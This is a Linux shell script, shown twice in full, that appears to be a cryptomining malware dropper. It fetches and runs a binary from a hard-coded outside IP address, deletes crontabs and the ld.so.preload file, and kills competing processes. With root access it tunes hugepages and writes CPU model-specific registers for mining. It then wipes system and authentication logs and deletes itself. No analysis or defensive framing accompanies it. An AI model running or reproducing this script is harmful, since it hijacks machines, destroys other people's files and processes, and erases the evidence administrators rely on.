export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
exec 2>/dev/null
cc=http://68.142.129.4:8277/download
sys=$(date|md5sum|awk -v n="$(date +%s)" '{print substr($1,1,n%7+6)}')
exe=$sys
get() {
    curl -k $1>$2 2>/dev/null  || wget --no-check-certificate -q -O- $1>$2 ||cc -k $1>$2 2>/dev/null ||  ww -q -O- $1>$2 
    chmod +x $2 
}
chattr -ia /etc/ld.so.preload ||true
cat /dev/null > /etc/ld.so.preload ||true
crontab -r ||true


if [ "$(id -u)" -eq 0 ];then
         yy ||true
         tt ||true
else
 echo "No root"
fi
find /tmp /var/tmp -mindepth 1 -maxdepth 1 -name ".*" ! -name "." ! -name ".." -exec rm -rf {} + 2>/dev/null||true
for pid in /proc/[0-9]*; do
    exe="$pid/exe"
    [ -L "$exe" ] || continue
    path=$(readlink "$exe")
    name=$(basename "$path")
    if echo "$path" | grep -q '(deleted)'; then
        kill -9 $(basename $pid)
		rm -rf "$path" 2>/dev/null
    elif [ ${#name} -eq 12 ]; then
        size=$(stat -c%s "$path" 2>/dev/null)
        if [ "$size" != "2320760" ]; then
            kill -9 $(basename $pid)
			rm -rf "$path" 2>/dev/null
        fi
    fi
done


readDir() {
	u=$(whoami)
	for dir in $(find  /home /root /opt /usr /var /etc -type d -user "$u" -writable -perm -u=wx  -not -path "/tmp*" -print -quit 2>/dev/null);do
		echo "$dir"
	done
}
cd $(readDir)||cd /tmp || cd /var/tmp





PATH=".:$PATH"
get $cc/app2 $sys  
$sys &
pid=$!
ls -la $(pwd)/$sys
sleep 3
rm -rf $sys

trap 'rm -- "$0"' EXIT
echo 0>/var/spool/mail/root ||true
echo 0>/var/log/wtmp ||true
echo 0>/var/log/secure ||true
echo 0>/var/log/cron ||true



function yy() {
        sysctl -w vm.nr_hugepages=$(nproc)

                for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
                do
                        echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
                done
}
function tt() {

        MSR_FILE=/sys/module/msr/parameters/allow_writes

                if test -e "$MSR_FILE"; then
                        echo on > $MSR_FILE
                else
                        modprobe msr allow_writes=on
                fi

if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo > /dev/null;
        then
        if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo > /dev/null;
                then
                        if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo > /dev/null;
                                then
                                        echo "Detected Zen4 CPU"
                                        wrmsr -a 0xc0011020 0x4400000000000
                                        wrmsr -a 0xc0011021 0x4000000000040
                                        wrmsr -a 0xc0011022 0x8680000401570000
                                        wrmsr -a 0xc001102b 0x2040cc10
                                else
                                        echo "Detected Zen3 CPU"
                                        wrmsr -a 0xc0011020 0x4480000000000
                                        wrmsr -a 0xc0011021 0x1c000200000040
                                        wrmsr -a 0xc0011022 0xc000000401500000
                                        wrmsr -a 0xc001102b 0x2000cc14
                                fi
                else
                        wrmsr -a 0xc0011020 0
                        wrmsr -a 0xc0011021 0x40
                        wrmsr -a 0xc0011022 0x1510000
                        wrmsr -a 0xc001102b 0x2000cc16
                fi
elif grep "Intel" /proc/cpuinfo > /dev/null;
        then
                wrmsr -a 0x1a4 0xf

fi
}
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
exec 2>/dev/null
cc=http://68.142.129.4:8277/download
sys=$(date|md5sum|awk -v n="$(date +%s)" '{print substr($1,1,n%7+6)}')
exe=$sys
get() {
    curl -k $1>$2 2>/dev/null  || wget --no-check-certificate -q -O- $1>$2 ||cc -k $1>$2 2>/dev/null ||  ww -q -O- $1>$2 
    chmod +x $2 
}
chattr -ia /etc/ld.so.preload ||true
cat /dev/null > /etc/ld.so.preload ||true
crontab -r ||true


if [ "$(id -u)" -eq 0 ];then
         yy ||true
         tt ||true
else
 echo "No root"
fi
find /tmp /var/tmp -mindepth 1 -maxdepth 1 -name ".*" ! -name "." ! -name ".." -exec rm -rf {} + 2>/dev/null||true
for pid in /proc/[0-9]*; do
    exe="$pid/exe"
    [ -L "$exe" ] || continue
    path=$(readlink "$exe")
    name=$(basename "$path")
    if echo "$path" | grep -q '(deleted)'; then
        kill -9 $(basename $pid)
		rm -rf "$path" 2>/dev/null
    elif [ ${#name} -eq 12 ]; then
        size=$(stat -c%s "$path" 2>/dev/null)
        if [ "$size" != "2320760" ]; then
            kill -9 $(basename $pid)
			rm -rf "$path" 2>/dev/null
        fi
    fi
done


readDir() {
	u=$(whoami)
	for dir in $(find  /home /root /opt /usr /var /etc -type d -user "$u" -writable -perm -u=wx  -not -path "/tmp*" -print -quit 2>/dev/null);do
		echo "$dir"
	done
}
cd $(readDir)||cd /tmp || cd /var/tmp





PATH=".:$PATH"
get $cc/app2 $sys  
$sys &
pid=$!
ls -la $(pwd)/$sys
sleep 3
rm -rf $sys

trap 'rm -- "$0"' EXIT
echo 0>/var/spool/mail/root ||true
echo 0>/var/log/wtmp ||true
echo 0>/var/log/secure ||true
echo 0>/var/log/cron ||true



function yy() {
        sysctl -w vm.nr_hugepages=$(nproc)

                for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
                do
                        echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
                done
}
function tt() {

        MSR_FILE=/sys/module/msr/parameters/allow_writes

                if test -e "$MSR_FILE"; then
                        echo on > $MSR_FILE
                else
                        modprobe msr allow_writes=on
                fi

if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo > /dev/null;
        then
        if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo > /dev/null;
                then
                        if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo > /dev/null;
                                then
                                        echo "Detected Zen4 CPU"
                                        wrmsr -a 0xc0011020 0x4400000000000
                                        wrmsr -a 0xc0011021 0x4000000000040
                                        wrmsr -a 0xc0011022 0x8680000401570000
                                        wrmsr -a 0xc001102b 0x2040cc10
                                else
                                        echo "Detected Zen3 CPU"
                                        wrmsr -a 0xc0011020 0x4480000000000
                                        wrmsr -a 0xc0011021 0x1c000200000040
                                        wrmsr -a 0xc0011022 0xc000000401500000
                                        wrmsr -a 0xc001102b 0x2000cc14
                                fi
                else
                        wrmsr -a 0xc0011020 0
                        wrmsr -a 0xc0011021 0x40
                        wrmsr -a 0xc0011022 0x1510000
                        wrmsr -a 0xc001102b 0x2000cc16
                fi
elif grep "Intel" /proc/cpuinfo > /dev/null;
        then
                wrmsr -a 0x1a4 0xf

fi
}
